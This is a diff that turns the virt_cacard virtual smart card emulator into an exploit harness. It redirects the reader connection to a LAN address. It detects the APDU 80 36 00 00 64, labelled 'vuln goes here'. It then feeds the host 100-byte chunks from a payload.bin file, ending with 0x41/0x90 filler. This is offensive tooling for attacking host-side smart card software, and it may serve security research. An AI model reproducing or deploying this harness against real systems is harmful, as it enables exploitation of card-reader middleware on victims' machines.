@@ -1,0 +1,141 @@
+diff --git a/src/virt_cacard.c b/src/virt_cacard.c
+index d025900..ec93275 100644
+--- a/src/virt_cacard.c
++++ b/src/virt_cacard.c
+@@ -33,6 +33,12 @@
+ #include "connection.h"
+ #include "glib-compat.h"
+ 
++
++#include <sys/types.h>
++#include <sys/stat.h>
++#include <fcntl.h>
++
++
+ #define ARGS "db=\"sql:%s\" use_hw=removable" //no need for soft options with use_hw=removable
+ 
+ typedef enum convmode{
+@@ -61,7 +67,8 @@ static gboolean action_insert = FALSE, action_remove = FALSE;
+  **  the reader name is automatically detected
+  **/
+ static const char* reader_name;
+-static const char hostname[] = "127.0.0.1";
++static const char hostname[] = "192.168.88.220";
++//static const char hostname[] = "127.0.0.1";
+ static uint16_t port = VPCDPORT;
+ 
+ static gpointer events_thread(gpointer data)
+@@ -190,13 +197,13 @@ static VCardEmulError init_cacard(void)
+ }
+ 
+ 
+-//void print_apdu(uint8_t *apdu, int length){
+-//    printf("APDU:\t");
+-//    for(int i = 0; i < length; i++){
+-//        printf("0x%x ", apdu[i]);
+-//    }
+-//    printf("\n");
+-//}
++void print_apdu(uint8_t *apdu, int length){
++    printf("APDU:\t");
++    for(int i = 0; i < length; i++){
++        printf("0x%x ", apdu[i]);
++    }
++    printf("\n");
++}
+ 
+ 
+ /**
+@@ -281,6 +288,10 @@ gboolean make_reply_poweron(void){
+  **/
+ gboolean make_reply_apdu(uint8_t *buffer, int send_buff_len)
+ {
++    static char in_exploit = 0;
++    static int exploit_len = 0;
++    static int pl_fd = 0;
++    int n_read = 0;
+     int receive_buf_len = APDUBufSize;
+     uint8_t part1, part2, receive_buff[APDUBufSize];
+     VReaderStatus status;
+@@ -294,9 +305,52 @@ gboolean make_reply_apdu(uint8_t *buffer, int send_buff_len)
+         printf("Error getting reader\n");
+         return FALSE;
+     }
+-    status = vreader_xfr_bytes(r, buffer, send_buff_len, receive_buff, &receive_buf_len);
++
++    if(in_exploit == 1){
++
++	if(!pl_fd){
++		printf("Opening Payload File\n");
++		pl_fd = open("./payload.bin", O_RDONLY);
++		printf("Success? %d\n", pl_fd);
++	}
++
++	n_read = read(pl_fd, receive_buff, 0x64);
++
++	if(n_read != 0x64){
++		printf("End of exploit payload, handle me (we read only %d bytes)\n", n_read);
++        memset(receive_buff, 0x41, 0x64);
++		receive_buff[0x64] = 0x90;
++		receive_buff[0x65] = 0x00;
++		receive_buf_len = 0x66;
++	}
++	else {
++		exploit_len += n_read;
++		receive_buf_len = 0x66;
++		receive_buff[0x64] = 0x63;
++		receive_buff[0x65] = 0x64;
++	}
++
++	status = VREADER_OK;
++	in_exploit = 0;
++
++	printf("Exploit len: %d\n", exploit_len);
++
++    }
++    else if(buffer[0] == 0x80 && buffer[1] == 0x36 && buffer[2] == 0x00 && buffer[3] == 0x00 && buffer[4] == 0x64) {
++	    printf("vuln goes here\n");
++
++	    receive_buf_len = 2;
++	    receive_buff[0] = 0x61;
++	    receive_buff[1] = 0x64;
++	    status = VREADER_OK;
++	    in_exploit = 1;
++    }
++    else{
++	    status = vreader_xfr_bytes(r, buffer, send_buff_len, receive_buff, &receive_buf_len);
++    }
+     if (status == VREADER_OK) {
+-        //print_apdu(receive_buff, receive_buf_len);
++	printf("reply\n");
++        print_apdu(receive_buff, receive_buf_len);
+     } else {
+         /* We need to reply anyway */
+         printf("xfr apdu failed\n");
+@@ -439,9 +493,11 @@ static gboolean do_socket_read(GIOChannel *source, GIOCondition condition, gpoin
+             }
+         }else{
+             g_debug("%s: Received APDU of size %i:\n", __func__, rcvLength);
+-//            print_apdu(buffer, rcvLength);
++	      printf("got: \n");
++              print_apdu(buffer, rcvLength);
+             if(make_reply_apdu(buffer, rcvLength)){
+                 g_debug("%s: card answered to APDU\n", __func__);
++                //print_apdu(buffer, rcvLength);
+                 isOk = TRUE;
+             }else{
+                 g_debug("%s: Failed to answer to APDU\n", __func__);
+@@ -599,6 +655,13 @@ void display_usage(void)
+         "\n");
+ }
+ 
++void printhex(char *buf, int len){
++	for(int i=0; i<len; i++)
++		printf("%2x", buf[i]);
++	printf("\n");
++
++}
++
+ int main(int argc, char* argv[])
+ {
+     gboolean insert = FALSE, remove = FALSE;
